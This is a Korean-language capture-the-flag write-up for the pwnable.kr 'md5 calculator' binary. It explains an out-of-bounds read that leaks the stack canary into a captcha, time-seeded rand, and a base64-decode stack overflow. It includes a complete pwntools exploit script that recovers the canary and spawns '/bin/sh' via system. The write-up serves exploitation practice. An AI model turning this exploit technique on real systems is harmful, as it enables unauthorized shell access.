---
sort: 2
---

# md5 calculator

hash 바이너리를 다운받자.<br><br>
hash 바이너리는 32bit이기 때문에 64bit 라이브러리를 사용할 수 없다.<br>
libssl1.0.0이 없다고 hash 바이너리가 실행이 되지 않을경우, 아래 명령어를 통해 32bit ssl라이브러리를 설치해주자.

```bash
sudo apt-get install libssl1.0.0:i386
```

<img src="/picture/pwnable.kr/md5_1.png" width="1000"/>

main함수에서 my_hash함수를 통해서 captcha를 만들어내고, captcha를 입력받게 한 뒤 일치할 경우에만 process_hash함수를 호출한다.<br><br>

<img src="/picture/pwnable.kr/md5_2.png" width="1000"/>

captcha를 만들어내는 my_hash함수에서는 int buf[8] 공간을 만든 뒤, 각각의 공간에 random값을 채워넣은 후에 random값들의 연산을 통해 captcha를 만들어낸다.<br>
그런데 여기서 흥미로운점은, buf[0]부터 buf[7]값을 사용해야하는데, buf[1]부터 buf[8]까지 사용하여 oob가 난다는 것이다.<br>
그리고 buf[8]부분에는 stack canary가 들어있다. 따라서 captcha를 만들어내는데 stack canary가 사용이 된다는 사실을 알 수 있다.<br><br>

<img src="/picture/pwnable.kr/md5_3.png" width="1000"/>

process_hash함수는 사용자로부터 0x400byte만큼 base64로 encode 된 값을 받아와 decode해서 buf에 저장한 후 해당 값의 md5 hash값을 구해서 출력해주는 모습이다.<br>
여기서 base64는 한 글자당 6bit를 의미하기 때문에 decode를 할 경우 길이가 약 3/4로 줄어들게 된다.<br>
또한 여기서 흥미로운점은, decode된 값이 저장되는 buf의 길이가 0x200byte밖에 되지 않아 최대 0x100byte가 overflow가 날 수 있다는 점이다.<br><br>
그러나, stack canary가 존재하기 때문에 이를 우회할 방법을 생각해야한다.<br><br>

## stack canary 우회

### 1. bruteforce

제일 먼저 1byte씩 bruteforce하는 방법을 생각했다. 그러나 이 문제에서는 안된다.<br>
일단, hash 프로그램을 이용할 때마다 canary 값이 같다는 보장이 없다.<br>
같다고 치더라도, base64문을 decode하고 buf에 복사할 때 `BIO_read`함수를 사용하는데, 이 함수는 결과물의 맨 끝에 NULL문자를 붙여주기 때문에 또한 안된다.

### 2. my_hash함수

my_hash함수에서 captcha를 만들 때 stack canary값이 사용되기 때문에 captcha를 만드는 식을 알고 있으므로 다시 지지고 볶으면 stack canary값을 얻어낼 수 있다.<br>
문제는 그렇게 하기 위해서는 random값 8개를 알아내야 한다는 것인데, 이를 위해서는 srand에 들어가는 seed값을 알아내야한다는 것이다.<br><br>
srand에 seed값으로 time함수의 반환값을 사용하고 있다. **여기서 중요한 점은, time함수의 반환값의 단위는 ms가 아니라 그냥 s, 즉, 초단위이다.**<br>
따라서 srand(time(NULL))을 하고, 초가 바뀌기 전에 hash 프로그램의 srand(time(NULL))이 실행된다면, captcha를 만드는데 사용되는 random값을 알아낼 수 있다는 것이다.<br>
그리고 pwnable.kr 9002를 nc를 이용해서 접속하게 되면, 매우 느린 것 뿐만 아니라, 내 컴퓨터의 시각과 서버의 시각이 달라서 time함수의 반환값이 다를 수 있다는 것이다.<br>
따라서 pwnable.kr 서버에 아무 계정으로 접속을 한 후에, /tmp 폴더 아래에서 script를 짜서 진행했다.

```python
from pwn import *
import base64
from ctypes import *
from ctypes.util import find_library

libc = CDLL(find_library("c"))
libc.srand(libc.time(0))

p = remote("localhost", 9002)
p.recvuntil("Are you human? input captcha : ")
num = p.recvuntil("\n")

p.send(num)

num = int(num[:-1])

random_values = []
for _ in range(8):
    random_values.append(libc.rand())

canary = num - random_values[1]
canary -= random_values[2]
canary += random_values[3]
canary -= random_values[4]
canary -= random_values[5]
canary += random_values[6]
canary -= random_values[7]

if canary < 0:
    canary += 0x100000000

'''
Welcome! you are authenticated.
Encode your data with BASE64 then paste me!
'''
p.recvline()
p.recvline()

system = 0x08048880
g_buf = 0x0804b0e0

payload = b"A"*512 + p32(canary) + b"A"*12 + p32(system) + b"AAAA" + p32(g_buf)
base64_payload = base64.b64encode(payload)

# base64_payload길이 + null문자 1byte
sh_addr = g_buf + len(base64_payload) + 1

# padding 512byte + canary + padding 12byte + system함수 주소 + padding(ret addr) + "/bin/sh" 주소
payload = b"A"*512 + p32(canary) + b"A"*12 + p32(system) + b"AAAA" + p32(sh_addr)
base64_payload = base64.b64encode(payload)

p.send(base64_payload + b"\x00/bin/sh\n")

p.interactive()
```

"/bin/sh"문자열은 그냥 g_buf안에다가 base64로 encode된 값 뒤에 추가로 넘겨줘서 박아넣었다.<br>
사용자의 input을 받을 때 fgets함수를 이용해서 받는다. fgets는 개행을 만날 때까지 입력값을 받기 때문에, NULL문자도 입력할 수 있다.<br>
"/bin/sh"문자열을 그냥 base64 문자열 바로 뒤에 붙여버리면 base64 decode가 되지 않기 때문에 중간에 NULL문자를 넣어서 base64 문자열까지만 복호화루틴에서 사용될 수 있도록 해야한다.

## 부록

### calcDecodeLength

<img src="/picture/pwnable.kr/md5_4.png" width="1000"/>

### Base64Decode

<img src="/picture/pwnable.kr/md5_5.png" width="1000"/>

```tip
## 알게 된 점

base64

stack canary
```